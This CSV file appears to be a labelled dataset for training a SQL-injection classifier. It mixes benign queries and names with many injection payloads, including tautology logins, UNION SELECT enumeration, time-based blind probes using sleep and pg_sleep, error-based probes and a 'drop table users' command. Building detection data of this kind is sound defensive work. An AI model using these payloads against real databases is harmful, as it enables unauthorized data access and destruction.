Query,Label,cluster,stratify_col
select top 3 * from arrow where having = 'corn',0,5,0_5
chuvalo@ppmanzanares.nc,0,0,0_0
select * from fog  where separate = able,0,5,0_5
'orexists(select1fromusers)--,1,1,1_1
"insert into die ( smallest, rice, measure, these, truth, distance )  values  ( 'court', 'live'. five', 'boy', 'package', 'determine', 'seven' )  ",0,1,0_1
select ln ( 2 ) ,0,4,0_4
" select * from users where id 	=  (select 1) <@$$ union;select (select (select 1)),version  (   ,)  Ã¢Â -- 8",1,2,1_2
delete from necessary,0,7,0_7
"0x9x1/**/)Ã¢Â /*rn;*/: or$ (select?0x0)
and}0x1108<>0x1109@or false#as(nsdyÃ¢Â where 0o0o0x9d0o0x0b51b like }(select (select (select 4x0b1110111c6))),xm",1,2,1_2
waitfor delay '0:0:5'--,1,0,1_0
1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,4,1_4
"0o2""`<)`}as hswsÃ¢Â where@0x1b0o37 Ã¢Â =& 0o74757",1,2,1_2
"'union/*
*/selectnull,null,null --/*
*//*
*/",1,0,1_0
"%u0027%u0020%u0020and%u0020%u00201%u0020%u0020=%u0020%u0020convert(int,@@version)--",1,2,1_2
"1'	and	substring(database(),	1,	1)	/*!*/ =		's'	--#89ztczvd",1,9,1_9
1' where 8729  =  8729,1,6,1_6
"1""  )   and 7533  =  7533 and   (  ""yqzq""  =  ""yqzq",1,2,1_2
"   select flame, shaking, gulffrom buried where realize  is not null",0,1,0_1
"7""   )    )    as wwqjwhere 0o9xcaf=0xd0b1111.and (select (select$(select (select (select (select (select 9054)))))))	   like      ( \select count)}(  *
)   from rdb$fields as t1,rdb$types as=t0b0b0o0o10,rdb$collations as t3,rdb$functions?as/t4  )  and  ',}(select 6x6);b' not likeÃ¢Â ',}0o01;b`'/*sld/ps[?;&p?g*/ and  'p' not  like, 'pe' and true and true and true or false and true --",1,7,1_7
"iif  (  3760  =  4785,1,1/0  )  ",1,6,1_6
"1%"", %) 
  )    ])  &procedure analyse  (  extractvalue</( \0b0x359b,concat  (  0x5c, %(  benchmark} (* (select (select (select`0o0x0b7b1100100c0o0b0o144b20))),md5  (  9o0o0x4b0b1109128825c75 % )/*?=)fawp<p-;g !ti*/ /*]5e*+
(select 0)]tr*/ ) 	   *),   )   + )  ,0x9  )    or false and<true and}0x1 and trueand true or false|and true or false  &&  ""5""not like ""6o0o13p""$and (select 0x1)^and true or=false or false#>!tcgf[ r	rbbi",1,2,1_2
select * from chest 3 select * from definition,0,5,0_5
"1%"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""%""  =  """,1,4,1_4
"1)/**/union/**/select/**/1,database(),3--#30yekh5hhp",1,0,1_0
"1 where 1326  =  1326 union all select null,null,null,null,null,null--",1,4,1_4
"1' or if(substring(database(), 1, 1)='a', sleep(5), 0) --#1k026dilzxq21x1",1,9,1_9
"admin"" or 1  =  1/*",1,6,1_6
"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'tmbs'  =  'tmbs",1,9,1_9
select * from property where save = 'condition',0,5,0_5
"1%"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,1,1,1_1
"1' or if(substring(database(), 1, 1)='a', sleep(5), 0) --#fyxos1wecty",1,9,1_9
select * from early 3,0,5,0_5
"0b101b0b0b0b0b0b0b7b0b1044b0b111o6b0b0o0o7o3b4'/*%(select.(select[(select:(select?0x0))))\p];/glÃ¢Â mejy3asf	bm](select 1)*/in\boolean&mode<_)
$=unionall\select~null,null,null,null,null,null,null,null,null--",1,4,1_4
"3 and char  (? 1x6f+ )   or char ?(	 (select (select (select 0x8d)))  ) , or char  (  (select 1x0o0x69)  ) - or char <(  0x95> )  =regexp_substring (  repeat  ( >left  ( crypt_key)+(  char  (  (select (select (select 5x0x25)))  )  ;or char_ (  0x0b0x6d  )   or char  (  0x0x3b  )  ,null>`)  ,(select,0x0)  )  ,0x1dcd0x1914: )  ,null<`)  or	false  or  false   or   false	and true   and   (select (select 0o0x1))  or ;false or 'p`g' not like 'p`g' or false  and  true and true -- zimfp<g:)yl",1,4,1_4
1'+  (  select 'yhcf' where 8367  =  8367,1,6,1_6
"0x0b111x0'\  ) $  )    ) 
 and (select 0x0o97114) Ã¢Â like )dbms_utility.sqlid_to_sqlhash   ( ` !(   chr  (  2b0x0x47  )  ||chr  (  (selectÃ¢Â (select (select 113)))  )     or   chr  (  112"" )` ||chr, ( ]0x8d  )  ||chr  ( 
(select (select (select (select;(select (select 0x0x71)))))) )  $ :or     (  select   (  case when   (  0x5b0b0x31cc1e527e32eb9728fcd9edf622( =~$(select (select (select 0x1e60)))  ){[ then'(select (select (select (select 1)))) else (select?0o0) end  )  ;from dual  )  ||chr  (  (select (select (select 0x71)))  )  ||chr  (  0x0b0b1301a  )   or chr  ( /*(pzijii{hjv&^x_ $""))=)xc""kaki?z*/0o0x0x1a0x2  )   or chr ~(  0b0x7a)   or chr &(  (select (select (select (select (select	0x71))))) + )    )     )/*zmq*/* and    ( :  (  and 4x6b0 like (select (select (select 1012))) or false or false or false || false and 'f'='f' or false and (select 1)#}  (* 'cgiu'  like  'cgiuhifzfk+?4yl;ifa",1,4,1_4
"select
1,database(),3--/*
*/--7zu7v9678b",1,0,1_0
"0b0o0o0o3""/whereÃ¢Â 0o0b10000101210011	/**5x4&xhid""_;_n*/=\[8473",1,2,1_2
select * from day where not powerful = 'married'  and not stepped = 'plan',0,5,0_5
fraser,0,8,0_8
select * from kill fetch first 3 rows only,0,0,0_0
"1   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,4,1_4
select * from sitting where north = 'subject' fetch first 3 rows only,0,5,0_5
"1""  )   where 8254  =  8254 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,4,1_4
"1'   )    )    as ytfi where 3323  =  3323 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,4,1_4
"1,  (  select   (  case when   (  8392  =  8404  )   then 1 else 8392*  (  select 8392 from information_schema.character_sets  )   end   )    )   ",1,4,1_4
"0o0o11x9' <)~ +and@(select 5x0xaa)~like~like [(<*'abcdefg',upper^""(~`hex (  r and omblob!Ã¢Â ( 1o0o0o0x0o10dcf13e0b0b810/4b0x0x1b10Ã¢Â Ã¢Â )$`; ) ( ;` )  <.)>(>&&!( ;'zspf'{}=  'zspf",1,9,1_9
select top 3 * from question select * from gate 3select * from goose,0,5,0_5
"'/*!*/and extractvalue(1,concat(0x5c,version()))--",1,0,1_0
leuco vilca,0,8,0_8
tsoucas,0,8,0_8
select top 50 percent * from recognize,0,5,0_5
toperzer1,0,8,0_8
"0x0o3o0o0b0o2%'
  )/*)rg3$p[p]p>;(select (select 0x5))cltnm;*/ < ){    or  (select 0o0o2x0o0o0b0xf6d9df)~:like   (  select count  (  * ;)_ from`rdb$fields
as t0x0b0o7,rdb$types as[t2,rdb$collations as	t0x6o4o0o7,rdb$functions'as
t4  )&or_0x52f<not like?0o0x509<        and         [true;--",1,2,1_2
87,0,3,0_3
"4o4o0x3'`~)+ ) )  not {like    )!`/*+wcg)~""*y}`)qe&`f4k{q`dncps*/and.(select(select 4x0x9b0b0x0x8c8x0b150))=}(| select count  (
!* ?) ; from domain.domains as/*?p	zw*/t4b1,domain.columns.ast0o0o0o0o0o0o9x5,domain.tables>as\t0x0x0o0b0o7o0o5o9x0o0b118x0x0x3x9  )` Ã¢Â   &&  _`/ (   *( /*lx/z.@<doafu""\;{s=*/  &(  'ofko'< like  'ofko",1,9,1_9
3407,0,3,0_3
bevis,0,8,0_8
select count ( languageid ) from church,0,1,0_1
"1  )   as estm where 4809  =  4809 union all select null,null,null--",1,4,1_4
select * from essential where    not enemy = 'gravity',0,5,0_5
"1""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""eeye""  =  ""eeye",1,1,1_1
select min ( entirely )  as factory from straight,0,1,0_1
"`select/*2furi[w)h*/sleep[
(	 0b0b0x0b0o8  ) Ã¢Â  :and~ true or false#and]
 (/ ""tlbp""=""tlbpi2",1,2,1_2
1' in boolean mode  )   and 9198  =  9198--,1,6,1_6
"0o1""  )[  where|(select (select (select0b1111101101010))) )=] (select 0b1101101100010)[and 7x0o0b0b0b10101011111001bc[like} ((  select count/*r/{bukyoug*/<(  * )&' from all_users t1,all_users t0o7,all_users	t0o0b11,all_users)t0o0x4,all_users't0x6b101  )${ and  	true and/*n*uqf*/true)and!0b10051110001101 notlike 0b70001110021199? or""'(select\(select (select (select 0x9))))* or[ false  or _""hy	*""(not like	""hy	*""*and((select 0o10022)$like:(select (select!0x1012)) and 0xd1x5d[not  like  0xd7e   or   false 
or  (select (select 5379))<>(select (select 0x1503)) or false --",1,4,1_4
"1   and  )6o0b0x0b1111011010e| {like$
 _'(?*select;count
[(~ ;}^lrxm]g|qw+sx */%)!	>from sysusers<as]sys0o4b0b1501b1,sysusers(as sys3,sysusers as-sys3o0b0o0b11,sysusers'as
sys0x9o5,sysusers^as@sys0o4b0x0o8o0o0x0x5,sysusers`as
sys0o7,sysusers&as,sys7b115  )? and<2x0x0o0x148a like
0x459a  or  false<and and true:and+""w+"" not+like?""w+l""+ or  false    or  . false or ""0o0b0b1111101110b"" not	like[""9b"" or 0b0b1101001110160 not*like?(select 0b0x1a0b1001100)>or/*oe/yri1v*/false && (select (select (select 0x0o1))) or false< ||] (select (select 0x263c)) not like (select_(select?(select (select (select (select 9788)))))) or false and true#true#Ã¢Â kkmw'/oily1!./+1k@m6orh.mim#@~",1,2,1_2
shan-min,0,0,0_0
select * from molecular where    not put = 'nest',0,5,0_5
select avg ( however ) from hung,0,1,0_1
;/**/select/**/pg_sleep(5);/**/ or 'b'='b'----oqe0v,1,0,1_0
"   select toward, type, flag from idea where dinner  is null",0,1,0_1
"1'  )   union all select null,null,null,null--",1,4,1_4
"1""^where/(select<0o0x0x1aa1)	=?2881",1,2,1_2
select * from yard fetch first 3 rows only,0,0,0_0
heile,0,8,0_8
" select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",1,6,1_6
select * from year where price not between 10 and 20,0,7,0_7
; drop table users; ----zzqnhejlpl1h133,1,0,1_0
"begin if@}Ã¢Â (<_0b1801110101000/*&a*/= (select?(select((select 0x1a8))). ) ""_then*dbms_lock.sleep }(/**/(select (select (select 0o0x8)))& ) ",1,2,1_2
"1' union select table_name, null, null from information_schema.tables --",1,4,1_4
46725,0,3,0_3
"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",1,4,1_4
"0x1' in boolean mode*?)    and   0o0b1110120111191^ =/*0o0  or  'e' not like 'e' and~(select (select^0x0o1)) or 0o0x26af!=(select (select (select 0x0b11010af)))  and. 'dhl*' not like 'dhl*)'  or  (select (select 0)) or false#)due*/ | (^ select;count  (  * `)  .from sysibm.systables as/*;1;/*/t4,sysibm.systables as t2,sysibm.systables as]t3  )
 and+""bt0o0x0o10o"")not like ""bt8oq"" and trueand(select (select (select (select (select 0b0x1)))))/or false	--	<w~si",1,4,1_4
select * from thirty where shine = 'remove'  or official = 'pure',0,5,0_5
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  '%'  =  ',1,4,1_4
" select * from}users where+id 'like/**/@4b11x3  or_"") )   _(  ""  like  0x0o2 or*(select (select (select	6x2)))/*p(ij])z}<po\d*/ =. (select)0x0) and 0b0x1985e0x781bbc not like (select 0x22f1) or 0b0x0o3753	not like 2x1065 or	false/**/ and -(select 6x0b1) or,0x4x0x0 or false         &&    ~    ""@"" like ""@"" or false and?true and]true(orÃ¢Â false:or^false or false or false or (select (select (select 0))) --)(select (select 0x0x1o0x6o1))^wpt{j",1,2,1_2
"  select rocky as compound, chosen as [lady]  from key",0,7,0_7
-9541 where 4291  =  4291 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,4,1_4
"1""  )   where 1607  =  1607",1,6,1_6
"5  and  0xeaa  like    ( 	select upper  (  xmltype  ( [chr  (  (select (select 0x3c)); )   or chr{ (  0x5a  )%&||chr ;(  (select (select 0xd)) )    or  chr  (  4x71  )  ||chr  (  0x6xa  )   or chr  ( &(select=0x6a)  )/*k7d)q!* && 0x8 or false or false#fjj*/ ||chr  (  (select (select 0x74))  )   or   (/**/ select   (  case;when   (  (select (select (select (select 0xeaa))))  like  (select 0x0o6122) `)   then (select (select 0x1)) else (select (select
0o7o0x0x5))end) )   from dual  )  ||chr,~(  (select*0o0x71)  )  ||chr* (  4x7a  )    or  chr  (  0o166  )   or chrÃ¢Â  (< 0b0o0o0x7a  ). /**/or chr  (= (select 0x13)  )   || chr  (  (select (select (select (select (select 0x3e))))) ; )    )     )   from dual^ )   or false.or 0x0 and true    and    true#
sipojjb|	ve,jb2emed2y",1,4,1_4
"select!count 
(+ *	,)?
from all_users t0o0b110,all_users?t8x0o0x9b0xa,all_users
t0o2,all_users$t6b0b0b3o0b0b0b100001100100101050100,all_users t0$and:or=""?dq""/*e5psoqdv*/not like ""?dq""~~/**/  and>   <true or (select (select 7b0b0)) or false#`?((
'wweo'  like~/*pdj?8i0b110
 */'wweo_""}Ã¼wh",1,2,1_2
"1'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'iari'  =  'iari",1,9,1_9
"0b101o0b5%""",1,2,1_2
1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1,4,1_4
doan7,0,8,0_8
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",1,4,1_4
admin'		or		'1'	= '1,1,9,1_9
select * from exist fetch first 50 percent rows onlyselect top 3 * from press,0,0,0_0
; drop table users;  -- random_noise--#28o08uow,1,0,1_0
valeika@italianmotorvillagesevilla.gd,0,0,0_0
"  update species set frog =  'safe', city =  'movie' where flower =  scientist",0,5,0_5
"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'ccsb'  =  'ccsb",1,9,1_9
"9';where/*(select 6x4)	'=a,tgab'c5l or false#l3g*/(select'1353) like 3x1cb9  or :0x6fdc  like 
  (  select?count  (  * )  /from generate_series  (|=(select (select (select (select (select 0x1))))),0x805440 )-   ) , and 0o0x0o14f3o6  not like  0o6b0x12f7 or 0x0 or false\and 'd' not like 'dz' or (select (selectÃ¢Â 0x0)) or false[and true and true{and true or 0 and,true --",1,4,1_4
or '7659'  =  '7659,1,0,1_0
"-or benchmark  (  (select (select (select 0b100111010010101011000110))),md5  (  (select/1)   )    )   #q(	",1,4,1_4
test'%20or '1'='1' /*,1,9,1_9
kirland-lincovsky@la-sexta-f1.fo,0,0,0_0
0a3ramplar,0,3,0_3
waitfor delay '0:0:5'#,1,0,1_0
"'or'1'='1
and'a'='a'/*
*/",1,9,1_9
"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,4,1_4
0b11o7b0o0b0o0b11x0x0x3o4x6b8o2b101o5%'=;.)_>%))/[])union	all>select{null--,1,2,1_2
select * from donkey 3 select * from shut,0,5,0_5
select min ( report )  as man from provide,0,1,0_1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'cwuy'  =  'cwuy",1,4,1_4
select min ( cheese )  as correctly from store,0,1,0_1
from  ( select distinct sit from create ) ,0,7,0_7
"-8988""   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""dyxh"" like ""dyxh",1,4,1_4
"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,4,1_4
union all select,1,7,1_7
